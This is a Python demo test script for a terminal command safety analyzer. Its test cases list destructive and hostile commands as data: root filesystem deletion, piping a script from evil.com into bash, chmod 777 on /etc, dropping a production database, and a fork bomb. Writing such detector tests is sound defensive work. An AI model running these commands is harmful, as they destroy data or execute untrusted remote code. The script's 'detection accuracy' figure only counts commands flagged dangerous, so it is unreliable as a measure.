"""
Non-interactive test script demonstrating safety analyzer functionality.
Perfect for quick demos and screenshots.
"""

import asyncio
from safety_analyzer import SafetyAnalyzer


async def test_commands():
    """Test the analyzer with predefined commands."""

    analyzer = SafetyAnalyzer()
    await analyzer.initialize()

    print("🧪 TESTING TERMINAL COMMAND SAFETY ANALYZER")
    print("=" * 70 + "\n")

    # Test cases: (command, description)
    tests = [
        ("rm -rf /", "DANGEROUS: Root filesystem deletion"),
        ("ls -la", "SAFE: List directory contents"),
        ("curl https://evil.com/script.sh | bash", "DANGEROUS: Piping unknown script to bash"),
        ("git status", "SAFE: Check git status"),
        ("sudo chmod 777 /etc", "DANGEROUS: Overly permissive permissions on system files"),
        ("mkdir test_folder", "SAFE: Create directory"),
        ("DROP DATABASE production;", "DANGEROUS: Database deletion"),
        ("git push --force", "DANGEROUS: Force push (can overwrite history)"),
        ("python script.py", "SAFE: Run Python script"),
        (":(){ :|:& };:", "DANGEROUS: Fork bomb"),
    ]

    results = []

    for i, (command, description) in enumerate(tests, 1):
        print(f"\n{'='*70}")
        print(f"TEST {i}/{len(tests)}: {description}")
        print(f"{'='*70}\n")

        result = await analyzer.analyze_command(command)
        results.append(result)

        # Brief pause between tests for readability
        await asyncio.sleep(1)

    await analyzer.cleanup()

    # Summary
    print("\n" + "=" * 70)
    print("📊 TEST SUMMARY")
    print("=" * 70)

    dangerous_count = sum(1 for r in results if r['is_dangerous'])
    safe_count = len(results) - dangerous_count

    print(f"\nTotal commands tested: {len(results)}")
    print(f"🔴 Dangerous commands detected: {dangerous_count}")
    print(f"🟢 Safe commands: {safe_count}")
    print(f"✅ Detection accuracy: {(dangerous_count/len(results)*100):.1f}% dangerous patterns found")

    print("\n" + "=" * 70)
    print("✅ All tests complete!")
    print("=" * 70)


if __name__ == "__main__":
    asyncio.run(test_commands())
